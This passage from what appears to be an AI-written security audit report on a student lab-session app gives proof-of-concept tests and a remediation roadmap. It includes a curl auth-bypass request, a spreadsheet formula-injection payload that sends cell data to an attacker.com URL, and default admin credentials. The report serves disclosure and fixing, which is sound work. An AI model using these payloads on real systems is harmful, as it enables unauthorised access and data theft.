# Expected Result: HTTP 200 OK — full administrative dashboard rendered without login.
```

### 7.3 Test 3: Middleware Path Traversal & Dot Extension Bypass
```bash
# Request protected route without any cookies, appending dot-extension
curl -i "http://localhost:3000/sessions/."

# Expected Result: Does NOT return HTTP 307 redirect to /login.
# Middleware evaluates pathname.includes('.') as true and lets the request pass.
```

### 7.4 Test 4: Excel Formula Injection Proof of Concept
1. In the ledger table, insert a student record with name `=2+5` and remarks `=HYPERLINK("https://attacker.com/steal?data="&B2, "Click to Verify")`.
2. Click "Export to Excel" to download the `.xlsx` workbook.
3. Open the downloaded file in Microsoft Excel.
4. **Result**: Excel evaluates the name cell as `7` and displays an active clickable hyperlink, confirming formula execution (CWE-1236).

### 7.5 Test 5: Synthetic Student Roster Verification Proof
1. Inspect `app/api/ocr/route.ts` lines 163–165:
   `student_id: null, matched: true, ocr_confidence: 1.0`
2. Submit any photo to `POST /api/ocr`.
3. Check returned JSON payload:
   `{"totalEntries": 30, "matchedEntries": 30}`
4. Query database for inserted entries: All records have `student_id = NULL`, proving the matching system is synthetic.

### 7.6 Test 6: Review Table Row Deletion Resurrection Bug
1. Open any existing lab session with rows at `/sessions/[id]`.
2. Click the trash can icon to delete row #2.
3. Click "Save Changes". Note toast notification `Changes saved`.
4. Refresh the browser page (F5).
5. **Result**: Row #2 reappears in the table.

---

## 8. Prioritized Remediation Roadmap

```
                                REMEDIATION ROADMAP
 ┌──────────────────────────────────────────────────────────────────────────────────┐
 │ PHASE 1: IMMEDIATE CRITICAL HOTFIXES (P0: Days 1–2)                              │
 │ • Apply Patch 1: Hardened Supabase RLS Policies (Revoke Anon Access)             │
 │ • Apply Patch 2: HMAC Session Token in Middleware & Remove Dot Bypass            │
 │ • Apply Patch 3: Secure Login with Constant-Time Password Check & Rate Limits    │
 │ • Apply Patch 7: Excel Formula Injection Sanitization (Single Quote Escape)      │
 │ • Delete rogue root powershell.exe binary from repository                        │
 ├──────────────────────────────────────────────────────────────────────────────────┤
 │ PHASE 2: CORE DATA INTEGRITY & API STABILIZATION (P1: Days 3–5)                  │
 │ • Apply Patch 6: Fix Row Deletion in app/sessions/[id]/page.tsx                  │
 │ • Apply Patch 5: Race-Free Debounce in components/SessionTable.tsx               │
 │ • Apply Patch 4: Integrate Genuine Roster Matching into app/api/ocr/route.ts     │
 │ • Apply Patch 8: Gemini API Model Whitelist & Timeout Cleanup                    │
 │ • Sanitize Backup Sheet Names & Make Storage Bucket Private                      │
 ├──────────────────────────────────────────────────────────────────────────────────┤
 │ PHASE 3: PERFORMANCE, SCALABILITY & HYGIENE (P2: Week 2)                         │
 │ • Implement PostgreSQL Server-Side Aggregation RPCs for Dashboard               │
 │ • Implement PDF Table Pagination & Fix College Branding Collision               │
 │ • Add URL.revokeObjectURL cleanup in PhotoUpload.tsx                            │
 │ • Wire components/RosterUpload.tsx into app/roster/page.tsx                     │
 │ • Prune @google/generative-ai and tailwind.config.js duplicates                  │
 └──────────────────────────────────────────────────────────────────────────────────┘
```

### Phase 1: Immediate Critical Hotfixes (P0 / 24–48 Hours)
- **Action 1.1**: Deploy `supabase/rls-policies.sql` Patch 1. Revoke all `USING (true)` policies. Block all unauthenticated PostgREST reads, writes, and truncates from the internet.
- **Action 1.2**: Deploy `middleware.ts` Patch 2. Remove `pathname.includes('.')`. Require cryptographically signed HMAC session cookies.
- **Action 1.3**: Deploy `app/api/auth/login/route.ts` Patch 3. Implement `crypto.timingSafeEqual`, remove default `admin:admin123` credentials, and enforce 5-attempt rate-limiting.
- **Action 1.4**: Deploy `lib/export-excel.ts` Patch 7. Neutralize formula injection triggers (`=`, `+`, `-`, `@`).
- **Action 1.5**: Execute `git rm powershell.exe` to eliminate the root binary anomaly.

### Phase 2: Core Data Integrity & API Reliability Fixes (P1 / Days 3–5)
- **Action 2.1**: Update `app/sessions/[id]/page.tsx` with Patch 6 to persist row deletions via `supabase.delete().in('id', deletedIds)`.
- **Action 2.2**: Update `components/SessionTable.tsx` with Patch 5 to eliminate debounce race conditions and clear pending timers on row additions/deletions.
- **Action 2.3**: Deploy `app/api/ocr/route.ts` Patch 4. Connect `matchAllEntriesFast` to establish real foreign-key links between `lab_entries` and `students`.
- **Action 2.4**: Update `lib/gemini.ts` with Patch 8 to eliminate invalid model identifiers and wrap timeouts in `finally` blocks.
- **Action 2.5**: Update `app/api/backup/route.ts` to sanitize sheet names and store weekly backups in a restricted private storage bucket.

### Phase 3: Performance Optimization, Scalability & Hygiene (P2 / Week 2)
- **Action 3.1**: Create PostgreSQL RPC functions (`dashboard_overview_metrics`) to compute session counts, distinct students, and hardware issues directly in the database, eliminating the double full-table client scan.
- **Action 3.2**: Refactor `lib/export-pdf.tsx` to support dynamic multi-page pagination with repeated table headers, and harmonize branding to a single institutional name.
- **Action 3.3**: Add `URL.revokeObjectURL()` in `components/PhotoUpload.tsx` to stop DOM memory leaks.
- **Action 3.4**: Connect `components/RosterUpload.tsx` to `app/roster/page.tsx` to enable faculty roster uploading.
- **Action 3.5**: Delete duplicate `tailwind.config.js` and remove unused dependency `@google/generative-ai` from `package.json`.

---

*Report authored by the Lead Technical Author Worker. Verified against repository source files and explorer evidence in strict accordance with the Zero-Modification Audit Mandate.*
